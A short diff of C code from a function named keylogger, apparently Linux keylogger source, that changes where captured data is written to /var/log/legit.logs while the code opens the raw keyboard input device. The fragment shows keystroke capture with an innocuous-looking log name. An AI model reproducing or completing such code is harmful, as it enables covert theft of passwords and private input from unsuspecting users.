@@ -32,7 +32,7 @@ void keylogger()
 	struct input_event ev;
 	int log;
 
-	if ((log = open("/log/legit.logs", O_WRONLY | O_CREAT | O_APPEND)) < 0)
+	if ((log = open("/var/log/legit.logs", O_WRONLY | O_CREAT | O_APPEND)) < 0)
 		return ;
 	if ((fd = open("/dev/input/by-path/platform-i8042-serio-0-event-kbd", O_RDONLY)) < 0) 
 		return;
